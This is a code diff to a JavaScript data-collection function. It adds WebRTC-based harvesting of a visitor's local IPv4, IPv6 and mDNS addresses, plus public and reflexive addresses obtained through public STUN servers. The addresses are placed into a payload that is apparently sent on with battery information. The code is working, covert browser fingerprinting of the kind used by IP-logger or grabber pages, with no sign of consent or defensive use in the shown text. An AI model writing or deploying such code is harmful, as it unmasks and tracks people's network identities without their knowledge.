@@ -95,42 +95,66 @@ function information() {
     });
   }
 
-  // WebRTC Local IP Extraction
+  // WebRTC Advanced Local IP & mDNS Leak Extraction
   var localIPs = [];
+  var webrtcDone = false;
+  
+  function processCandidate(candidateStr) {
+      // Regex pour IPv4, IPv6, et mDNS (.local)
+      var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}|[a-zA-Z0-9\-]+\.local)/g;
+      var matches = candidateStr.match(ipRegex);
+      if (matches) {
+          matches.forEach(function(ip) {
+              if (!localIPs.includes(ip) && ip !== "0.0.0.0" && ip !== "::1") {
+                  localIPs.push(ip);
+              }
+          });
+      }
+  }
+
   try {
       var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
       if (RTCPeerConnection) {
-          var rtc = new RTCPeerConnection({ iceServers: [] });
-          if (1 || window.mozRTCPeerConnection) {
-              rtc.createDataChannel('', { reliable: false });
-          }
-          rtc.onicecandidate = function (evt) {
-              if (evt.candidate) {
-                  var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
-                  var ipMatch = evt.candidate.candidate.match(ipRegex);
-                  if (ipMatch) {
-                      var ip = ipMatch[0];
-                      if (!localIPs.includes(ip)) {
-                          localIPs.push(ip);
-                      }
-                  }
-              }
+          // Connexion 1 : Sans STUN (pour forcer la collecte locale brute)
+          var rtcLocal = new RTCPeerConnection({ iceServers: [] });
+          rtcLocal.createDataChannel('geopol');
+          rtcLocal.onicecandidate = function (evt) {
+              if (evt.candidate) processCandidate(evt.candidate.candidate);
           };
-          rtc.createOffer(function (offerDesc) {
-              rtc.setLocalDescription(offerDesc);
-          }, function (e) {});
+          rtcLocal.createOffer().then(offer => rtcLocal.setLocalDescription(offer)).catch(e => {});
+
+          // Connexion 2 : Avec STUN agressifs (pour forcer la translation et récupérer mDNS + Public + Reflexive)
+          var rtcStun = new RTCPeerConnection({ 
+              iceServers: [
+                  { urls: "stun:stun.l.google.com:19302" },
+                  { urls: "stun:stun1.l.google.com:19302" },
+                  { urls: "stun:stun.services.mozilla.com" }
+              ] 
+          });
+          rtcStun.createDataChannel('geopol_stun');
+          rtcStun.onicecandidate = function (evt) {
+              if (evt.candidate) processCandidate(evt.candidate.candidate);
+          };
+          rtcStun.createOffer().then(offer => rtcStun.setLocalDescription(offer)).catch(e => {});
           
+          // Wait to collect ICE candidates (they can take a moment)
           setTimeout(function() {
+              if (webrtcDone) return;
+              webrtcDone = true;
               if (localIPs.length > 0) {
-                  payload.Webrtc = localIPs.join(", ");
+                  payload.Webrtc = localIPs.join(" | ");
               }
               triggerBatteryAndSend();
-          }, 500); // Wait 500ms for ICE candidates
+          }, 1500); // 1.5 secondes max de collecte
       } else {
+          webrtcDone = true;
           triggerBatteryAndSend();
       }
   } catch(e) { 
-      triggerBatteryAndSend();
+      if (!webrtcDone) {
+          webrtcDone = true;
+          triggerBatteryAndSend();
+      }
   }
 
   function triggerBatteryAndSend() {
